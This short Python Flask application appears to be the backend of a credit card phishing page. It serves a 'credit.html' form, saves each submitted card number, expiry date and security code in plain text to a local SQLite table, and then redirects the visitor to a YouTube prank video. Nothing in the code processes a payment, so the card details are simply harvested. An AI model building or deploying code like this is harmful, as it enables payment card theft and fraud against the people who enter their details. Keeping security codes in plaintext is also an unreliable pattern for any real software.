import flask as f
from flask import request
import sqlite3

# con = sqlite3.connect('credit.db')
# con.execute('CREATE TABLE cardinfo(CardNumber TEXT, ExpiryDate TEXT, SecurityCode TEXT)')
# con.commit()
# con.close()

app = f.Flask(__name__)

@app.route('/', methods=['GET','POST'])
def home():
    if request.method == 'GET':
        return f.render_template('credit.html')
    if request.form['num'] and request.form['date'] and request.form['code'] != '':
        con = sqlite3.connect('credit.db')
        con.execute('INSERT INTO cardinfo(CardNumber, ExpiryDate, SecurityCode) VALUES(?,?,?)',
                    (request.form['num'],request.form['date'],request.form['code']))
        con.commit()
        con.close()
        return f.redirect('https://youtu.be/dQw4w9WgXcQ')
    return 'no data'

@app.route('/photos/<filename>')
def get_file(filename):
    return f.send_from_directory('templates', filename)
if __name__ == '__main__':
    app.run()